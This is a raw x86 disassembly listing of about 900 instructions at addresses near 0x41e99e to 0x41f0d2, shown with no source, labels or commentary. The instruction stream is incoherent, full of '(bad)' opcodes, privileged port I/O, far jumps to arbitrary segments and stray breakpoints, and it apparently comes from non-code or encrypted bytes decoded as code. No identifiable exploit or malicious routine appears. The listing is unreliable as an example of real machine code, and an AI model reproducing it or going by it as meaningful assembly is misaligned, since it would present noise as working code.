  41e99e:	mov    es,edx
  41e9a0:	jge    0x41ea1c
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41ea0e
  41e9a7:	in     al,0x64
  41e9a9:	push   edi
  41e9aa:	retf   0xa864
  41e9ad:	mov    ebp,0x4f0fbce5
  41e9b2:	out    0xce,eax
  41e9b4:	mov    BYTE PTR [edx+0x3556649c],cl
  41e9ba:	out    0xa,al
  41e9bc:	or     bl,0x4e
  41e9bf:	adc    BYTE PTR [ecx+ebx*2-0x6],ah
  41e9c3:	ins    DWORD PTR es:[edi],dx
  41e9c4:	xor    esi,DWORD PTR cs:[eax-0x6e]
  41e9c8:	mov    ds:0xbd3b145c,al
  41e9cd:	mov    ds:0x53610ab7,eax
  41e9d2:	pop    edx
  41e9d3:	pop    ss
  41e9d4:	push   edi
  41e9d5:	ret    
  41e9d6:	in     eax,dx
  41e9d7:	sbb    DWORD PTR [ecx+0x1ebbc553],0xf27706b8
  41e9e1:	jno    0x41e96e
  41e9e3:	pop    ecx
  41e9e4:	scas   eax,DWORD PTR es:[edi]
  41e9e5:	aam    0xe2
  41e9e7:	scas   eax,DWORD PTR es:[edi]
  41e9e8:	mov    dh,al
  41e9ea:	and    dh,BYTE PTR [eiz*1+0x5b72c1e]
  41e9f1:	mov    ah,cl
  41e9f3:	das    
  41e9f4:	push   esi
  41e9f5:	jmp    0xff0d:0x4edc3d3c
  41e9fc:	adc    cl,BYTE PTR [ecx+0x48f51fd9]
  41ea02:	jl     0x41ea57
  41ea04:	syscall 
  41ea06:	cmp    cl,BYTE PTR [edx-0x61]
  41ea09:	jmp    0x41ea4a
  41ea0b:	jge    0x41ea3d
  41ea0d:	mov    WORD PTR [ebp+ebx*8-0x418b66f9],?
  41ea14:	xor    BYTE PTR [esi+edx*8+0x32],dh
  41ea18:	inc    edi
  41ea19:	add    bh,dh
  41ea1b:	test   BYTE PTR [ecx-0x4e61b7c5],dh
  41ea21:	cmp    DWORD PTR [esi-0x61],edi
  41ea24:	dec    esp
  41ea25:	shld   DWORD PTR [esi-0x2e],ecx,0x89
  41ea2a:	xchg   BYTE PTR [ecx+eiz*1+0x3ca89aec],dl
  41ea31:	sar    DWORD PTR [ecx-0x5d],1
  41ea34:	fcompp 
  41ea36:	ins    BYTE PTR es:[edi],dx
  41ea37:	and    eax,0x6a719497
  41ea3c:	repnz int3 
  41ea3e:	and    BYTE PTR [eax-0x3890bee0],bh
  41ea44:	mov    DWORD PTR [ecx+ebx*2+0x6d],ecx
  41ea48:	jecxz  0x41ea2c
  41ea4a:	xchg   DWORD PTR [edi],edx
  41ea4c:	les    eax,FWORD PTR [ebp+0xa]
  41ea4f:	test   al,0x8b
  41ea51:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ea53:	dec    ebp
  41ea54:	adc    dl,BYTE PTR [eax+0x3b6c0e2c]
  41ea5a:	outs   dx,DWORD PTR ds:[esi]
  41ea5b:	adc    ebx,DWORD PTR [esi+0x34ff8c2]
  41ea61:	mov    eax,ds:0xfb4ca5ae
  41ea66:	stos   DWORD PTR es:[edi],eax
  41ea67:	mov    eax,eax
  41ea69:	adc    eax,0xd6367241
  41ea6e:	ins    DWORD PTR es:[edi],dx
  41ea6f:	mov    ah,BYTE PTR [edx-0x480c2528]
  41ea75:	jmp    0xe589:0x77174042
  41ea7c:	fldenv [eax-0x28]
  41ea7f:	dec    edx
  41ea80:	cmp    DWORD PTR [ebp+0x46a7e47b],eax
  41ea86:	shl    BYTE PTR [eax],0x5f
  41ea89:	pushf  
  41ea8a:	dec    esi
  41ea8b:	lods   eax,DWORD PTR ds:[esi]
  41ea8c:	jno    0x41eaea
  41ea8e:	push   edi
  41ea8f:	inc    esp
  41ea90:	cmp    al,0x9b
  41ea92:	mov    esi,0x61350db9
  41ea97:	dec    eax
  41ea98:	push   esi
  41ea99:	add    DWORD PTR [eax-0x34ec3c0b],0xa3f3961d
  41eaa3:	sbb    eax,0x4f9b8ce2
  41eaa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaa9:	xchg   ebp,eax
  41eaaa:	and    DWORD PTR [esi+edx*1+0x79b552a0],0x58
  41eab2:	pop    ebx
  41eab3:	ret    
  41eab4:	inc    edi
  41eab5:	jns    0x41ea68
  41eab7:	dec    edx
  41eab8:	lock xchg esp,eax
  41eaba:	sti    
  41eabb:	inc    esi
  41eabc:	mov    esi,0x845b7176
  41eac1:	jnp    0x41eac2
  41eac3:	pop    ebp
  41eac4:	xchg   ecx,eax
  41eac5:	(bad)  
  41eac6:	ds int 0x4f
  41eac9:	sbb    BYTE PTR [eax],ah
  41eacb:	sbb    DWORD PTR [ecx],eax
  41eacd:	sbb    eax,0xd8f51c9a
  41ead2:	loopne 0x41eb19
  41ead4:	or     ch,BYTE PTR [esi-0x80]
  41ead7:	cs pop ebx
  41ead9:	mov    dh,0x41
  41eadb:	loope  0x41eab1
  41eadd:	mov    eax,0x820205f
  41eae2:	xor    al,0xd6
  41eae4:	mov    ch,0x60
  41eae6:	int3   
  41eae7:	stos   DWORD PTR es:[edi],eax
  41eae8:	ror    BYTE PTR [edx],1
  41eaea:	pushf  
  41eaeb:	add    eax,0x20f0fe5c
  41eaf0:	div    eax
  41eaf2:	cwde   
  41eaf3:	mov    cl,BYTE PTR [ebp+ebx*8+0x25]
  41eaf7:	jnp    0x41eaeb
  41eaf9:	jb     0x41eabb
  41eafb:	and    BYTE PTR [edi+ecx*8+0x10],bh
  41eaff:	mov    edi,DWORD PTR [ecx-0x12]
  41eb02:	or     al,BYTE PTR [edi+0x541f80da]
  41eb08:	xchg   DWORD PTR [ebx],ebp
  41eb0a:	mov    edx,0x6f9fdd57
  41eb0f:	pop    esp
  41eb10:	fld    TBYTE PTR [edx-0x701016fa]
  41eb16:	push   ebp
  41eb17:	cli    
  41eb18:	jns    0x41eb66
  41eb1a:	add    dh,bh
  41eb1c:	cmp    al,0xa0
  41eb1e:	and    al,0x8
  41eb20:	xchg   ecx,eax
  41eb21:	retf   0xa5b2
  41eb24:	inc    ebp
  41eb25:	stos   DWORD PTR es:[edi],eax
  41eb26:	imul   BYTE PTR [ebx-0x43]
  41eb29:	hlt    
  41eb2a:	out    dx,al
  41eb2b:	fnstcw WORD PTR [ebp-0x15]
  41eb2e:	icebp  
  41eb2f:	or     ebp,0x54
  41eb32:	ds dec ebx
  41eb34:	mov    esi,0xf766d897
  41eb39:	jns    0x41eb0d
  41eb3b:	jg     0x41eafa
  41eb3d:	retf   
  41eb3e:	xchg   esi,eax
  41eb3f:	adc    bh,BYTE PTR ss:[edi]
  41eb42:	mov    dh,BYTE PTR [eax+0x63c6ad9a]
  41eb48:	ja     0x41eb0f
  41eb4a:	add    bh,BYTE PTR [edx+0x4888af66]
  41eb50:	and    eax,DWORD PTR es:[ecx+0x36ac8029]
  41eb57:	adc    eax,0x8c961eed
  41eb5c:	jns    0x41eb66
  41eb5e:	mov    edx,0x87fa7c99
  41eb63:	enter  0x3b5e,0x18
  41eb67:	pushf  
  41eb68:	mov    bh,0xd6
  41eb6a:	pop    esi
  41eb6b:	mov    WORD PTR [ecx],ss
  41eb6d:	outs   dx,BYTE PTR ds:[esi]
  41eb6e:	bound  ebp,QWORD PTR [edx+0x58abc6cb]
  41eb74:	sbb    al,0x4e
  41eb76:	inc    eax
  41eb77:	push   edx
  41eb78:	leave  
  41eb79:	xor    eax,0x41576627
  41eb7e:	push   eax
  41eb7f:	ja     0x41eb89
  41eb81:	cs sti 
  41eb83:	push   ebx
  41eb84:	imul   DWORD PTR [edx]
  41eb86:	jne    0x41ebda
  41eb88:	push   eax
  41eb89:	fistp  QWORD PTR [ebx+0x5d]
  41eb8c:	retf   0x5282
  41eb8f:	sbb    BYTE PTR [esi+0x6d372abd],0xfb
  41eb96:	adc    DWORD PTR [edi+0x7b],ebx
  41eb99:	or     DWORD PTR [ebx+0x44],0xffffff84
  41eb9d:	mov    ebp,0xa77e0819
  41eba2:	pop    es
  41eba3:	out    0xb0,eax
  41eba5:	sub    dh,BYTE PTR ds:0xc4c4187d
  41ebab:	or     eax,0x70c577a9
  41ebb0:	xchg   ebx,eax
  41ebb1:	icebp  
  41ebb2:	stc    
  41ebb3:	(bad)  [ebx-0x665294b1]
  41ebb9:	push   edx
  41ebba:	shr    al,0xe2
  41ebbd:	rcr    BYTE PTR [ebx-0x1d],cl
  41ebc0:	call   0xce44:0xa22e6f54
  41ebc7:	push   0x4d
  41ebc9:	lds    ebp,FWORD PTR [edx]
  41ebcb:	nop
  41ebcc:	cmp    BYTE PTR [eax-0x8761f91],ah
  41ebd2:	jge    0x41ebcc
  41ebd4:	push   eax
  41ebd5:	or     al,0x4
  41ebd7:	je     0x41ec42
  41ebd9:	sub    dh,BYTE PTR [ecx+0x31b10c14]
  41ebdf:	cmp    BYTE PTR [eax+edi*8+0x77],ah
  41ebe3:	xchg   edx,eax
  41ebe4:	dec    ecx
  41ebe5:	and    dh,BYTE PTR [eax+edi*1]
  41ebe8:	pop    ebx
  41ebe9:	and    ebx,DWORD PTR [ebx-0x70398121]
  41ebef:	pop    es
  41ebf0:	jl     0x41ec46
  41ebf2:	sbb    DWORD PTR [esi],0x6c686157
  41ebf8:	mov    bl,0x12
  41ebfa:	adc    al,0x21
  41ebfc:	fiadd  DWORD PTR [edx-0x63]
  41ebff:	mov    ds:0xf2c48e28,eax
  41ec04:	mov    esi,0x2cf3754e
  41ec09:	sbb    bh,bh
  41ec0b:	sub    BYTE PTR [edx-0x457bb658],dl
  41ec11:	xchg   ebp,eax
  41ec12:	xor    al,0x9c
  41ec14:	in     eax,dx
  41ec15:	in     eax,dx
  41ec16:	mov    dh,0x5d
  41ec18:	ja     0x41ebab
  41ec1a:	jle    0x41ebb1
  41ec1c:	out    0x8e,al
  41ec1e:	push   cs
  41ec1f:	xchg   esi,eax
  41ec20:	sub    ebp,DWORD PTR [esi]
  41ec22:	pushf  
  41ec23:	repnz neg DWORD PTR [ecx+0x19a6cb4b]
  41ec2a:	test   BYTE PTR [ecx+0x56ff6162],0x92
  41ec31:	inc    ebp
  41ec32:	imul   esp,DWORD PTR [ecx],0x4b
  41ec35:	pop    ecx
  41ec36:	and    BYTE PTR [esi-0x7],dl
  41ec39:	nop
  41ec3a:	in     eax,0xf
  41ec3c:	mov    ecx,0xed383c95
  41ec41:	js     0x41ebd9
  41ec43:	xchg   ebp,eax
  41ec44:	aas    
  41ec45:	daa    
  41ec46:	shr    BYTE PTR [ebx-0x20],0xe2
  41ec4a:	in     eax,0x13
  41ec4c:	ds jnp 0x41ec60
  41ec4f:	cdq    
  41ec50:	inc    ebx
  41ec51:	(bad)  
  41ec52:	stc    
  41ec53:	sti    
  41ec54:	data16 ficom DWORD PTR ss:[esi-0x1]
  41ec59:	sbb    DWORD PTR [edi+0x6b],edx
  41ec5c:	xor    ebp,DWORD PTR [edi+0x53]
  41ec5f:	repnz cs scas al,BYTE PTR es:[edi]
  41ec62:	add    cl,bh
  41ec64:	and    edi,DWORD PTR [edi]
  41ec66:	das    
  41ec67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec68:	jp     0x41ec19
  41ec6a:	mul    ebp
  41ec6c:	jle    0x41ec16
  41ec6e:	retf   
  41ec6f:	lahf   
  41ec70:	xchg   esp,eax
  41ec71:	pop    es
  41ec72:	ds cmp al,0xc0
  41ec75:	je     0x41ecf0
  41ec77:	add    BYTE PTR [edx],dl
  41ec79:	sbb    al,0x2e
  41ec7b:	mov    esi,0xc5db05dc
  41ec80:	rcl    DWORD PTR [ebx-0x70],1
  41ec83:	jne    0x41ec78
  41ec85:	xlat   BYTE PTR ds:[ebx]
  41ec86:	ret    0xb62b
  41ec89:	scas   eax,DWORD PTR es:[edi]
  41ec8a:	gs into 
  41ec8c:	dec    esp
  41ec8d:	mov    bh,0x62
  41ec8f:	nop
  41ec90:	jb     0x41ecf3
  41ec92:	mov    edx,0xa14e7f71
  41ec97:	add    ax,0xa519
  41ec9b:	daa    
  41ec9c:	test   BYTE PTR [edx],0xee
  41ec9f:	(bad)  
  41eca0:	enter  0x4c26,0x54
  41eca4:	push   es
  41eca5:	icebp  
  41eca6:	out    0x4d,al
  41eca8:	push   ebp
  41eca9:	mov    cl,0xf2
  41ecab:	xlat   BYTE PTR ds:[ebx]
  41ecac:	xchg   ebx,eax
  41ecad:	dec    esp
  41ecae:	cwde   
  41ecaf:	sbb    DWORD PTR [edx],edi
  41ecb1:	push   esi
  41ecb2:	and    dh,BYTE PTR [edx+ebp*1-0x556ddd5b]
  41ecb9:	jne    0x41ed2c
  41ecbb:	out    dx,al
  41ecbc:	in     al,0x5a
  41ecbe:	leave  
  41ecbf:	neg    BYTE PTR [ebx-0x6d]
  41ecc2:	xor    eax,0x5c2997f7
  41ecc7:	lods   al,BYTE PTR ds:[esi]
  41ecc8:	inc    esp
  41ecc9:	xchg   ecx,eax
  41ecca:	inc    esp
  41eccb:	mov    cl,dl
  41eccd:	(bad)  
  41ecce:	sar    BYTE PTR [edi-0x7cd19240],1
  41ecd4:	push   ecx
  41ecd5:	mov    DWORD PTR [ecx],0xb69afdef
  41ecdb:	clc    
  41ecdc:	(bad)  
  41ecde:	addr16 dec edi
  41ece0:	xchg   BYTE PTR [edx],cl
  41ece2:	mov    ah,dh
  41ece4:	jle    0x41ecc6
  41ece6:	stos   DWORD PTR es:[edi],eax
  41ece7:	addr16 fldl2e 
  41ecea:	pop    ds
  41eceb:	sbb    BYTE PTR [edi-0x7256debb],dl
  41ecf1:	(bad)  
  41ecf2:	sbb    BYTE PTR [esi-0x38fda702],al
  41ecf8:	js     0x41ed33
  41ecfa:	(bad)  
  41ecfb:	xchg   esp,eax
  41ecfc:	daa    
  41ecfd:	add    BYTE PTR [ebp+0x5e],dl
  41ed00:	push   ebp
  41ed01:	shl    al,0x19
  41ed04:	stos   DWORD PTR es:[edi],eax
  41ed05:	jg     0x41ecef
  41ed07:	mov    ss,WORD PTR [eax+0x618b3365]
  41ed0d:	leave  
  41ed0e:	int    0xfb
  41ed10:	sub    DWORD PTR [edi],0x74
  41ed13:	js     0x41ed7b
  41ed15:	cli    
  41ed16:	adc    DWORD PTR ds:0x6497dd95,ebx
  41ed1c:	imul   esp,DWORD PTR [edi+0x86af215],0xffffff8c
  41ed23:	shl    DWORD PTR [esi-0x154ed8f6],1
  41ed29:	lods   al,BYTE PTR ds:[esi]
  41ed2a:	cdq    
  41ed2b:	and    ch,BYTE PTR [edi-0x50]
  41ed2e:	mov    eax,ds:0x2ad05f74
  41ed33:	mov    fs,WORD PTR [edx+eax*4+0x4a]
  41ed37:	out    0xa2,al
  41ed39:	mov    esi,0x66b5aaa4
  41ed3e:	std    
  41ed3f:	ja     0x41ed37
  41ed41:	push   esp
  41ed42:	dec    ecx
  41ed43:	dec    ebx
  41ed44:	mov    cl,0x81
  41ed46:	cmc    
  41ed47:	sbb    bh,BYTE PTR [edx-0x3]
  41ed4a:	or     eax,0x126ba7b5
  41ed4f:	ret    0x8580
  41ed52:	jg     0x41ed1c
  41ed54:	dec    ebx
  41ed55:	(bad)  
  41ed56:	popf   
  41ed57:	push   eax
  41ed58:	shl    esp,cl
  41ed5a:	dec    DWORD PTR [esi-0x5764be0]
  41ed60:	aaa    
  41ed61:	or     ebx,esi
  41ed63:	sbb    eax,0x6aff093b
  41ed68:	mov    DWORD PTR [ecx-0x2c],edx
  41ed6b:	cmp    esp,ecx
  41ed6d:	call   0xb045:0x7a8b1a85
  41ed74:	xlat   BYTE PTR ds:[ebx]
  41ed75:	add    bh,bl
  41ed77:	push   edx
  41ed78:	xor    cl,BYTE PTR [edi+0x19]
  41ed7b:	jnp    0x41ed14
  41ed7d:	push   0x4e
  41ed7f:	mov    al,0x0
  41ed81:	loope  0x41ed83
  41ed83:	test   eax,0x3f7f1c33
  41ed88:	inc    esp
  41ed89:	adc    bl,BYTE PTR [eax-0x7f2b5db8]
  41ed8f:	enter  0x2015,0x34
  41ed93:	pop    edi
  41ed94:	dec    edi
  41ed95:	adc    DWORD PTR [edx-0x33841d8f],eax
  41ed9b:	sahf   
  41ed9c:	scas   al,BYTE PTR es:[edi]
  41ed9d:	mov    dh,0xe7
  41ed9f:	adc    DWORD PTR [ebx+ecx*2-0x31],ebx
  41eda3:	std    
  41eda4:	das    
  41eda5:	mov    dh,0xc9
  41eda7:	cmp    al,0x4d
  41eda9:	sub    edx,ebp
  41edab:	outs   dx,BYTE PTR ds:[esi]
  41edac:	adc    al,0xe9
  41edae:	sti    
  41edaf:	loop   0x41eda9
  41edb1:	pop    esp
  41edb2:	mov    esp,DWORD PTR [edx-0x65723131]
  41edb8:	push   esi
  41edb9:	add    bh,BYTE PTR [ecx]
  41edbb:	push   0x7fdc0ac5
  41edc0:	ror    DWORD PTR [ebx],1
  41edc2:	iret   
  41edc3:	loope  0x41ed7d
  41edc5:	mov    ah,0x17
  41edc7:	or     DWORD PTR [bp+di-0x73],0x9386cd1e
  41edcf:	pop    ecx
  41edd0:	pop    edx
  41edd1:	mov    ebx,ecx
  41edd3:	sub    eax,0x6d284d71
  41edd8:	pusha  
  41edd9:	sbb    BYTE PTR [edi+0x41],dl
  41eddc:	js     0x41ee3d
  41edde:	mov    dh,0x29
  41ede0:	or     al,al
  41ede2:	mov    DWORD PTR [ebp-0x65],ecx
  41ede5:	pop    ecx
  41ede6:	repz popa 
  41ede8:	repnz ins BYTE PTR es:[edi],dx
  41edea:	xchg   ebp,eax
  41edeb:	test   dl,bl
  41eded:	xchg   ebp,eax
  41edee:	icebp  
  41edef:	sbb    DWORD PTR [ebx+0x12],edi
  41edf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edf3:	dec    edx
  41edf4:	mov    ecx,0xee342882
  41edf9:	pop    ecx
  41edfa:	ins    DWORD PTR es:[edi],dx
  41edfb:	retf   
  41edfc:	push   edx
  41edfd:	cmp    DWORD PTR [edx+0x52],ecx
  41ee00:	xor    eax,0xd54f80e5
  41ee05:	dec    edi
  41ee06:	fadd   DWORD PTR [eax]
  41ee08:	xor    DWORD PTR [ebx+0x2a0c32e7],0xffffffdf
  41ee0f:	test   eax,edi
  41ee11:	jbe    0x41ee69
  41ee13:	xchg   edx,eax
  41ee14:	mov    dh,0xad
  41ee16:	xor    DWORD PTR [ebx],ecx
  41ee18:	mov    dl,0x74
  41ee1b:	add    eax,0xafe2a05b
  41ee20:	ss in  al,0x3d
  41ee23:	cmp    eax,0x205f39a1
  41ee28:	out    dx,eax
  41ee29:	or     ah,cl
  41ee2b:	loope  0x41edd3
  41ee2d:	fs mov ah,0x8b
  41ee30:	ins    BYTE PTR es:[di],dx
  41ee32:	mov    eax,0x39fc66fc
  41ee37:	in     eax,dx
  41ee38:	inc    BYTE PTR [esi-0x14]
  41ee3b:	ror    BYTE PTR [ebx+0x2dd3daaa],0xd7
  41ee42:	inc    ecx
  41ee43:	inc    ebx
  41ee44:	sar    edx,0x56
  41ee47:	sbb    ebx,DWORD PTR [eax-0x25]
  41ee4a:	push   0xeb632ab
  41ee4f:	out    0x66,eax
  41ee51:	loope  0x41ee72
  41ee53:	fcomp  QWORD PTR [eax-0x4c]
  41ee56:	lds    edx,FWORD PTR [esi]
  41ee58:	jge    0x41ee3a
  41ee5a:	or     dh,BYTE PTR [esp+ebp*2-0x45]
  41ee5e:	and    al,0xfa
  41ee60:	and    al,0x56
  41ee62:	inc    ecx
  41ee63:	inc    eax
  41ee64:	mov    eax,0xdcb3ea42
  41ee69:	jp     0x41ee32
  41ee6b:	out    dx,al
  41ee6c:	fild   DWORD PTR [esi+0x49]
  41ee6f:	mov    ds:0x3c6c0d9a,eax
  41ee74:	fld    TBYTE PTR [ebp-0x78]
  41ee77:	push   0x372e2a15
  41ee7c:	shl    DWORD PTR [edx],1
  41ee7e:	outs   dx,DWORD PTR ds:[esi]
  41ee7f:	popa   
  41ee80:	(bad)  
  41ee81:	cmp    eax,eax
  41ee83:	imul   eax,eax,0xdd011185
  41ee89:	mov    dh,0x85
  41ee8b:	and    ax,0x65f4
  41ee8f:	ror    BYTE PTR [ebp+edi*1+0x6],0xc0
  41ee94:	or     edx,DWORD PTR [edi]
  41ee96:	sub    ebx,ebx
  41ee98:	imul   ebp,DWORD PTR [eax-0x2f],0xffffffd6
  41ee9c:	shl    eax,0x32
  41ee9f:	fisubr DWORD PTR [esi-0x34057629]
  41eea5:	mov    bh,0xa3
  41eea7:	mov    ebx,0x275fc5a3
  41eeac:	fiadd  DWORD PTR [ebp-0x359b2dbf]
  41eeb2:	rcr    BYTE PTR [ebx+0x10],cl
  41eeb5:	push   ecx
  41eeb6:	mov    ebx,0x8ce58ad
  41eebb:	mov    esi,0x6723797b
  41eec0:	dec    edx
  41eec1:	cmp    eax,0xade38c00
  41eec6:	pop    eax
  41eec7:	sti    
  41eec8:	ins    DWORD PTR es:[edi],dx
  41eec9:	test   eax,0x327bc4c4
  41eece:	pop    edx
  41eecf:	rcr    DWORD PTR [ecx],1
  41eed1:	daa    
  41eed2:	push   esi
  41eed3:	popa   
  41eed4:	xchg   ebx,eax
  41eed5:	in     al,dx
  41eed6:	xchg   ecx,eax
  41eed7:	loope  0x41eee9
  41eed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeda:	sahf   
  41eedb:	out    dx,eax
  41eedc:	pop    ebx
  41eedd:	out    0x6d,al
  41eedf:	mov    BYTE PTR [esi+edi*8],dl
  41eee2:	retf   0xaec2
  41eee5:	mov    BYTE PTR [ecx-0x8],dl
  41eee8:	push   ds
  41eee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeea:	retf   
  41eeeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeec:	xchg   edx,eax
  41eeed:	shl    BYTE PTR [eax-0x66561046],1
  41eef3:	cmp    al,0x18
  41eef5:	retf   0x93c2
  41eef8:	jge    0x41eeff
  41eefa:	mov    bh,0x12
  41eefc:	(bad)  
  41eefd:	ins    DWORD PTR es:[edi],dx
  41eefe:	or     BYTE PTR [eax-0x7f],bl
  41ef01:	hlt    
  41ef02:	ror    edi,cl
  41ef04:	(bad)  
  41ef05:	pop    ebp
  41ef06:	dec    esp
  41ef07:	cmp    edx,DWORD PTR [edi]
  41ef09:	push   es
  41ef0a:	pop    ecx
  41ef0b:	push   ebp
  41ef0c:	and    BYTE PTR [eax],0xfc
  41ef0f:	push   esp
  41ef10:	addr16 dec esp
  41ef12:	jg     0x41ef54
  41ef14:	mov    dl,0xf1
  41ef16:	inc    edi
  41ef17:	push   eax
  41ef18:	mov    ds:0xeb7290ae,eax
  41ef1d:	cmp    bl,dl
  41ef1f:	push   edi
  41ef20:	push   ecx
  41ef21:	jecxz  0x41ef7d
  41ef23:	sub    ah,BYTE PTR [edx-0x3898b61e]
  41ef29:	dec    ecx
  41ef2a:	and    al,0xe1
  41ef2c:	inc    esp
  41ef2d:	lods   eax,DWORD PTR ds:[esi]
  41ef2e:	ret    0x6676
  41ef31:	pop    ss
  41ef32:	xchg   BYTE PTR [ebp-0x15],ch
  41ef35:	pop    eax
  41ef36:	jbe    0x41efb5
  41ef38:	or     esp,DWORD PTR [edi]
  41ef3a:	dec    ebp
  41ef3b:	icebp  
  41ef3c:	lods   al,BYTE PTR ds:[esi]
  41ef3d:	or     al,dh
  41ef3f:	imul   ebx,DWORD PTR [ebp-0x26d8dbf1],0xffffff8b
  41ef46:	push   ss
  41ef47:	pmaddwd mm1,QWORD PTR [edx]
  41ef4a:	xchg   ah,bl
  41ef4c:	aaa    
  41ef4d:	xchg   ecx,eax
  41ef4e:	pop    es
  41ef4f:	aas    
  41ef50:	scas   al,BYTE PTR es:[edi]
  41ef51:	push   edi
  41ef52:	mov    dh,0xd
  41ef54:	mul    DWORD PTR [esi+edi*4]
  41ef57:	push   ecx
  41ef58:	dec    ebx
  41ef59:	out    dx,al
  41ef5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef5b:	into   
  41ef5c:	lods   eax,DWORD PTR ds:[esi]
  41ef5d:	cmp    eax,0x8644ab54
  41ef62:	test   DWORD PTR [edx+0x6c9f9db2],esp
  41ef68:	cli    
  41ef69:	dec    ecx
  41ef6a:	jge    0x41ef16
  41ef6c:	data16 lock int3 
  41ef6f:	loope  0x41efab
  41ef71:	in     al,dx
  41ef72:	lea    ebp,[ecx-0x78]
  41ef75:	pop    ebx
  41ef76:	sub    BYTE PTR [ebp-0x1c3280f8],al
  41ef7c:	data16 aas 
  41ef7e:	push   edx
  41ef7f:	mov    dl,0xc0
  41ef81:	push   edi
  41ef82:	mov    ebx,0xf964b15a
  41ef87:	xchg   DWORD PTR [edx+0x780f70d],ebp
  41ef8d:	stos   DWORD PTR es:[edi],eax
  41ef8e:	out    0x10,eax
  41ef90:	stos   DWORD PTR es:[edi],eax
  41ef91:	push   ebp
  41ef92:	inc    esi
  41ef93:	cmc    
  41ef94:	push   0x67b11d42
  41ef99:	or     DWORD PTR [esi+0x78],edx
  41ef9c:	push   ds
  41ef9d:	pop    eax
  41ef9e:	inc    esp
  41ef9f:	pop    ecx
  41efa0:	adc    dl,BYTE PTR [eax]
  41efa2:	mov    dl,0xc3
  41efa4:	push   es
  41efa5:	dec    ebx
  41efa6:	jne    0x41ef77
  41efa8:	push   ebp
  41efa9:	sahf   
  41efaa:	or     eax,DWORD PTR [edx-0x5990eaa7]
  41efb0:	out    dx,al
  41efb1:	jae    0x41ef4e
  41efb3:	popa   
  41efb4:	es mov ebp,0x8c923a5c
  41efba:	js     0x41efa8
  41efbc:	ror    BYTE PTR [ebp-0x9],cl
  41efbf:	mov    esi,0x3c9f0243
  41efc4:	ret    0x88b9
  41efc7:	add    BYTE PTR [edi+0x71],bl
  41efca:	mov    ebp,0x17af0b80
  41efcf:	sbb    DWORD PTR [ecx+0x6],esi
  41efd2:	adc    edi,edx
  41efd4:	pop    edx
  41efd5:	ror    DWORD PTR [edi+0x11],cl
  41efd8:	adc    edi,DWORD PTR [edx+edi*4+0x7b]
  41efdc:	or     bh,dl
  41efde:	repz jl 0x41efc2
  41efe1:	jbe    0x41effb
  41efe3:	daa    
  41efe4:	idiv   BYTE PTR [ebp+0x460db29]
  41efea:	shr    DWORD PTR [ebx],0xf
  41efed:	ds or  eax,0x81bcb161
  41eff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eff4:	pushf  
  41eff5:	xor    cl,dl
  41eff7:	sbb    al,0x8
  41eff9:	sub    BYTE PTR [edx-0x2a],ch
  41effc:	jno    0x41efda
  41effe:	cmp    DWORD PTR [bx+di-0x4b30],edi
  41f003:	das    
  41f004:	mov    WORD PTR [ebx],ss
  41f006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f007:	sub    esp,ebp
  41f009:	addr16 pop es
  41f00b:	xor    eax,0x17e07d9
  41f010:	jmp    0x5654835
  41f015:	xchg   ecx,eax
  41f016:	push   esp
  41f017:	jne    0x41f08b
  41f019:	xor    al,0xa0
  41f01b:	adc    eax,0x45957100
  41f020:	jg     0x41efe2
  41f022:	inc    ecx
  41f023:	dec    ebp
  41f024:	and    edi,esi
  41f026:	lahf   
  41f027:	or     ebx,DWORD PTR [eax-0x3d]
  41f02a:	popa   
  41f02b:	hlt    
  41f02c:	mov    esp,0x397b97b2
  41f031:	cld    
  41f032:	adc    BYTE PTR ds:0xe44b81ea,bl
  41f038:	hlt    
  41f039:	mov    bh,0xed
  41f03b:	stc    
  41f03c:	jl     0x41f01d
  41f03e:	mov    ecx,0x8214780f
  41f043:	mov    ebp,0x9d168fcd
  41f048:	mov    DWORD PTR [ecx+0x58],0xe7fbd3e1
  41f04f:	xor    al,0x4
  41f051:	f2xm1  
  41f053:	jg     0x41f054
  41f055:	inc    edi
  41f056:	mov    eax,ds:0xa5d150e
  41f05b:	mov    BYTE PTR [edi],bh
  41f05d:	mov    dl,0xc7
  41f05f:	inc    ebp
  41f060:	je     0x41f0c8
  41f062:	std    
  41f063:	loop   0x41f0e4
  41f065:	shl    BYTE PTR [edx],1
  41f067:	popf   
  41f068:	aad    0x1a
  41f06a:	stos   BYTE PTR es:[edi],al
  41f06b:	jbe    0x41f052
  41f06d:	fnstenv [edx-0x43a2b2b7]
  41f073:	pop    ebp
  41f074:	cli    
  41f075:	clc    
  41f076:	mov    ebx,0x19d21219
  41f07b:	dec    eax
  41f07c:	sti    
  41f07d:	sbb    eax,0xe21e7a31
  41f082:	test   al,0x16
  41f084:	test   DWORD PTR [edi-0x31],esp
  41f087:	call   0xc390:0x70e5c4a3
  41f08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f08f:	sbb    esi,DWORD PTR [ebp+ebp*1+0x28423c74]
  41f096:	mov    ds:0x3b3cf11c,al
  41f09b:	jmp    0x41f060
  41f09d:	push   ebp
  41f09e:	stos   BYTE PTR es:[edi],al
  41f09f:	push   edx
  41f0a0:	aam    0x9
  41f0a2:	xchg   BYTE PTR [ebx],dh
  41f0a4:	push   ecx
  41f0a5:	in     eax,0x35
  41f0a7:	stc    
  41f0a8:	mov    bl,BYTE PTR [esi+0x58321b6d]
  41f0ae:	jg     0x41f049
  41f0b0:	and    BYTE PTR [ecx+edi*4+0x7628b631],bh
  41f0b7:	loope  0x41f03f
  41f0b9:	mov    WORD PTR [ebx+0x56],?
  41f0bc:	(bad)  
  41f0be:	jle    0x41f04b
  41f0c0:	and    DWORD PTR ds:0x8a5420a3,edi
  41f0c6:	imul   esp,DWORD PTR [ebp+0x14bb57c1],0x41
  41f0cd:	sub    bl,dh
  41f0cf:	inc    esi
  41f0d0:	or     eax,DWORD PTR [edi]
  41f0d2:	push   esi
